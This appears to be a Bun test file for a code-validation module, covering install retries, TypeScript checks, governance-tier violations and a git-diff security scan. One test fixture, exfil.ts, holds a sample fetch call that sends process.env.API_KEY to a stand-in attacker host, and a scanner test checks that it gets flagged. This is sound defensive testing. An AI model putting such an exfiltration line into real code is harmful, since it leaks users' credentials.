import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { mkdtemp, writeFile, rm, mkdir } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

/**
 * Tests for work/validation.ts — runBunInstall and runValidation.
 *
 * Uses real temp directories with minimal files so the spawned processes
 * run quickly and deterministically. Does NOT mock Bun.spawn — these are
 * lightweight integration tests that exercise the real validation pipeline.
 */

let tempDir: string;

beforeEach(async () => {
    tempDir = await mkdtemp(join(tmpdir(), 'work-validation-test-'));
});

afterEach(async () => {
    await rm(tempDir, { recursive: true, force: true });
});

describe('runBunInstall', () => {
    const { runBunInstall } = require('../work/validation') as typeof import('../work/validation');

    test('succeeds with frozen lockfile when package.json exists', async () => {
        await writeFile(join(tempDir, 'package.json'), JSON.stringify({ name: 'test', dependencies: {} }));
        await writeFile(join(tempDir, 'bun.lock'), '');

        // Should not throw
        await runBunInstall(tempDir);
    });

    test('retries without frozen lockfile on failure', async () => {
        // Create a package.json with a dependency but no lockfile
        // This will cause --frozen-lockfile to fail, triggering retry
        await writeFile(join(tempDir, 'package.json'), JSON.stringify({
            name: 'test-retry',
            dependencies: {},
        }));

        // Should not throw — retry without frozen-lockfile should succeed
        await runBunInstall(tempDir);
    });

    test('handles missing package.json gracefully', async () => {
        // No package.json — bun install will fail but shouldn't crash
        // The function may throw or succeed depending on bun behavior
        try {
            await runBunInstall(tempDir);
        } catch {
            // Expected — no package.json
        }
    });
});

describe('runValidation', () => {
    const { runValidation } = require('../work/validation') as typeof import('../work/validation');

    test('passes when all checks succeed in a valid project', async () => {
        // Create a minimal valid project
        await writeFile(join(tempDir, 'package.json'), JSON.stringify({
            name: 'test-valid',
            dependencies: {},
        }));
        await writeFile(join(tempDir, 'tsconfig.json'), JSON.stringify({
            compilerOptions: {
                strict: true,
                noEmit: true,
                skipLibCheck: true,
                module: 'esnext',
                moduleResolution: 'bundler',
            },
        }));

        // Create a simple TS file
        await mkdir(join(tempDir, 'src'), { recursive: true });
        await writeFile(join(tempDir, 'src', 'index.ts'), 'export const x: number = 1;\n');

        // Init git so diff doesn't fail badly
        const git = Bun.spawn(['git', 'init'], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
        await git.exited;
        const gitConfig1 = Bun.spawn(['git', 'config', 'user.email', 'test@test.com'], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
        await gitConfig1.exited;
        const gitConfig2 = Bun.spawn(['git', 'config', 'user.name', 'Test'], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
        await gitConfig2.exited;
        // Create initial commit on main
        const gitAdd = Bun.spawn(['git', 'add', '-A'], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
        await gitAdd.exited;
        const gitCommit = Bun.spawn(['git', 'commit', '-m', 'init', '--allow-empty'], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
        await gitCommit.exited;

        const result = await runValidation(tempDir);
        expect(result.output).toContain('TypeScript Check');
        // Tests may or may not pass depending on bun test behavior with no test files
    }, 30_000);

    test('fails when TypeScript check fails', async () => {
        await writeFile(join(tempDir, 'package.json'), JSON.stringify({
            name: 'test-tsc-fail',
            dependencies: {},
        }));
        await writeFile(join(tempDir, 'tsconfig.json'), JSON.stringify({
            compilerOptions: { strict: true, noEmit: true, module: 'esnext', moduleResolution: 'bundler' },
            include: ['*.ts'],
        }));

        // Create a file with a type error
        await writeFile(join(tempDir, 'bad.ts'), 'const x: number = "not a number";\n');

        // Init git
        const git = Bun.spawn(['git', 'init'], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
        await git.exited;

        const result = await runValidation(tempDir);
        expect(result.passed).toBe(false);
        expect(result.output).toContain('TypeScript Check Failed');
    }, 30_000);

    test('output includes test results section', async () => {
        await writeFile(join(tempDir, 'package.json'), JSON.stringify({
            name: 'test-results',
            dependencies: {},
        }));
        await writeFile(join(tempDir, 'tsconfig.json'), JSON.stringify({
            compilerOptions: { strict: true, noEmit: true, skipLibCheck: true, module: 'esnext', moduleResolution: 'bundler' },
        }));

        // Init git
        const git = Bun.spawn(['git', 'init'], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
        await git.exited;

        const result = await runValidation(tempDir);
        // Should have both TypeScript and Test sections
        expect(result.output).toContain('TypeScript Check');
        expect(result.output).toContain('Test');
    }, 30_000);

    test('handles install failure gracefully (non-fatal)', async () => {
        // Empty dir with no package.json — install will fail but validation continues
        // Init git
        const git = Bun.spawn(['git', 'init'], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
        await git.exited;

        const result = await runValidation(tempDir);
        // Should still have output (tsc and test results) even if install failed
        expect(result.output.length).toBeGreaterThan(0);
    }, 30_000);

    test('skips TypeScript check when no tsconfig.json exists (#1767)', async () => {
        // Create a project without tsconfig.json
        await writeFile(join(tempDir, 'package.json'), JSON.stringify({ name: 'no-ts', dependencies: {} }));

        // Init git
        const git = Bun.spawn(['git', 'init'], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
        await git.exited;

        const result = await runValidation(tempDir);
        // Should skip TSC gracefully instead of failing with help text
        expect(result.output).toContain('TypeScript Check Skipped');
        expect(result.output).not.toContain('TypeScript Check Failed');
    }, 30_000);

    test('runs security scan on git diff and reports Security Scan Passed', async () => {
        await writeFile(join(tempDir, 'package.json'), JSON.stringify({ name: 'test-scan', dependencies: {} }));
        await writeFile(join(tempDir, 'tsconfig.json'), JSON.stringify({
            compilerOptions: { strict: true, noEmit: true, skipLibCheck: true, module: 'esnext', moduleResolution: 'bundler' },
        }));

        async function gitCmd(...args: string[]) {
            const p = Bun.spawn(['git', ...args], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
            await new Response(p.stdout).text();
            await p.exited;
        }

        await gitCmd('init', '-b', 'main');
        await gitCmd('config', 'user.email', 'test@test.com');
        await gitCmd('config', 'user.name', 'Test');
        await gitCmd('add', '-A');
        await gitCmd('commit', '-m', 'init');

        // Create feature branch with a safe change
        await gitCmd('checkout', '-b', 'feature');
        await writeFile(join(tempDir, 'safe-file.ts'), 'export const safe = true;\n');
        await gitCmd('add', '-A');
        await gitCmd('commit', '-m', 'add safe file');

        const result = await runValidation(tempDir);
        expect(result.output).toContain('Security Scan Passed');
    }, 30_000);

    test('detects governance tier violations in diff', async () => {
        await writeFile(join(tempDir, 'package.json'), JSON.stringify({ name: 'test-gov', dependencies: {} }));
        await writeFile(join(tempDir, 'tsconfig.json'), JSON.stringify({
            compilerOptions: { strict: true, noEmit: true, skipLibCheck: true, module: 'esnext', moduleResolution: 'bundler' },
        }));

        async function gitCmd(...args: string[]) {
            const p = Bun.spawn(['git', ...args], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
            await new Response(p.stdout).text();
            await p.exited;
        }

        await gitCmd('init', '-b', 'main');
        await gitCmd('config', 'user.email', 'test@test.com');
        await gitCmd('config', 'user.name', 'Test');
        await gitCmd('add', '-A');
        await gitCmd('commit', '-m', 'init');

        // Create feature branch modifying a Layer 0 path (governance.ts is in LAYER_0_BASENAMES)
        await gitCmd('checkout', '-b', 'feature');
        await writeFile(join(tempDir, 'governance.ts'), '// modified governance file\nexport const x = 1;\n');
        await gitCmd('add', '-A');
        await gitCmd('commit', '-m', 'modify governance');

        const result = await runValidation(tempDir);
        expect(result.passed).toBe(false);
        expect(result.output).toContain('Governance Tier Violation');
    }, 30_000);

    test('detects default branch as master when no main branch exists', async () => {
        await writeFile(join(tempDir, 'package.json'), JSON.stringify({ name: 'test-master', dependencies: {} }));
        await writeFile(join(tempDir, 'tsconfig.json'), JSON.stringify({
            compilerOptions: { strict: true, noEmit: true, skipLibCheck: true, module: 'esnext', moduleResolution: 'bundler' },
        }));

        async function gitCmd(...args: string[]) {
            const p = Bun.spawn(['git', ...args], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
            await new Response(p.stdout).text();
            await p.exited;
        }

        // Init with master as default
        await gitCmd('init', '-b', 'master');
        await gitCmd('config', 'user.email', 'test@test.com');
        await gitCmd('config', 'user.name', 'Test');
        await gitCmd('add', '-A');
        await gitCmd('commit', '-m', 'init');

        // Create feature branch
        await gitCmd('checkout', '-b', 'feature');
        await writeFile(join(tempDir, 'safe.ts'), 'export const x = 1;\n');
        await gitCmd('add', '-A');
        await gitCmd('commit', '-m', 'add file');

        const result = await runValidation(tempDir);
        // Security scan should work — it should detect 'master' as the default branch
        expect(result.output).toContain('Security Scan Passed');
    }, 30_000);

    test('detects unapproved fetch calls in diff', async () => {
        await writeFile(join(tempDir, 'package.json'), JSON.stringify({ name: 'test-fetch', dependencies: {} }));
        await writeFile(join(tempDir, 'tsconfig.json'), JSON.stringify({
            compilerOptions: { strict: true, noEmit: true, skipLibCheck: true, module: 'esnext', moduleResolution: 'bundler' },
        }));

        async function gitCmd(...args: string[]) {
            const p = Bun.spawn(['git', ...args], { cwd: tempDir, stdout: 'pipe', stderr: 'pipe' });
            await new Response(p.stdout).text();
            await p.exited;
        }

        await gitCmd('init', '-b', 'main');
        await gitCmd('config', 'user.email', 'test@test.com');
        await gitCmd('config', 'user.name', 'Test');
        await gitCmd('add', '-A');
        await gitCmd('commit', '-m', 'init');

        await gitCmd('checkout', '-b', 'feature');
        await writeFile(join(tempDir, 'exfil.ts'), `
            const data = await fetch('https://evil.example.com/steal', {
                method: 'POST',
                body: JSON.stringify({ secret: process.env.API_KEY }),
            });
        `);
        await gitCmd('add', '-A');
        await gitCmd('commit', '-m', 'add exfil');

        const result = await runValidation(tempDir);
        expect(result.output).toContain('Security Scan');
    }, 30_000);
});
